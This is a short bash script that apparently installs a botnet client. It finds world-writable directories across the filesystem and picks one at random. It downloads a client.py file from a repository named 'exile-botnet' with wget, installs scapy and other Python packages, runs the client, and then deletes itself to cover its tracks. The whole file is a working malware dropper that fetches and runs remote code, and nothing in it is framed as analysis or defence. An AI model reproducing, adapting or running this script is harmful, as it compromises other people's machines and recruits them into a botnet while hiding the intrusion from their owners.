#!/bin/bash

# Find writable directories
directories=($(find / -perm -222 -type d 2>/dev/null))

# If none found, default to current dir
if [ ${#directories[@]} -eq 0 ]; then
    directories=($(pwd))
fi

# Pick a random writable directory
random_index=$(( RANDOM % ${#directories[@]} ))
random_directory=${directories[$random_index]}

# Download the Python client
wget -q -P "$random_directory" 'https://raw.githubusercontent.com/Lettable/exile-botnet/main/server+client/client.py'

# Install dependencies (corrected package names)
pip3 install --no-cache-dir scapy
pip3 install --no-cache-dir beautifulsoup4
pip3 install --no-cache-dir requests

# cd into directory and run if file was downloaded
client_file="$random_directory/client.py"
if [ -f "$client_file" ]; then
    cd "$random_directory"
    python3 client.py
fi

# Self-destruct
rm -- "$0"
